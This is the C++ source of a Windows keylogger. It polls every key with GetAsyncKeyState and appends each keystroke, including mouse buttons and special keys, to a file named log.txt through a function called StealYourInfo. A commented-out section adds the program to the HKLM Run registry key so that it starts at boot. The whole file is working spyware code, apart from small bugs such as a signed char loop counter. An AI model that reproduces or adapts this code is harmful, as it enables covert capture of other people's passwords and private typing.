#include "stdafx.h"
#include <iostream>
#include <Windows.h>
#include <stdio.h>


using namespace std;

int StealYourInfo(int _key, char *file);

int main() {
	char i;
	//console
	while (true) {
		//wait
		for (i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) 
			{
				StealYourInfo(i, (char*)"log.txt");
			}
				
		}
	}
	return 0;
}
int StealYourInfo(int _key, char *file) {
	cout << _key << endl;

	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+"); 

	if(_key == VK_SHIFT)
	{
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	}
	else if (_key == VK_BACK)
	{
		fprintf(OUTPUT_FILE, "%s", "[BACK]");
	}
	else if (_key == VK_LBUTTON)
	{
		fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");
	}
	else if (_key == VK_RBUTTON) 
	{
		fprintf(OUTPUT_FILE, "%s", "[RBUTTON]");
	}

	else if (_key == VK_RETURN) 
	{
		fprintf(OUTPUT_FILE, "%s", "[RETURN]");
	}
	else if (_key == VK_ESCAPE)
	{
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	}
	else if (_key == VK_OEM_1)
	{
	fprintf(OUTPUT_FILE, "%s", "[: or ;]");
	}

	else  
		fprintf(OUTPUT_FILE, "%s", &_key);
	
	fclose(OUTPUT_FILE);
	return 0;
}

//LONG lnRes = RegOpenKeyEx(
//	HKEY_LOCAL_MACHINE,  // handle of open key
//						 // The following is the address of name of subkey to open
//	"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
//	0L, KEY_WRITE,
//	&hKey            // address of handle of open key 
//);
//
//// now add program path to the RUN key
//lstrcpy((char *)szFilePath, LPCTSTR(m_strFileName));
//GetDlgItemText(IDC_KEYNAME, sKeyName);     //Get value name
//
//if (ERROR_SUCCESS == lnRes)
//{
//	lnRes = RegSetValueEx(hKey,
//		LPCTSTR(sKeyName),  // handle of the opened 
//							// key to set value for 
//		0,
//		REG_SZ,
//		szFilePath,   //value data
//		REG_SZ);
//}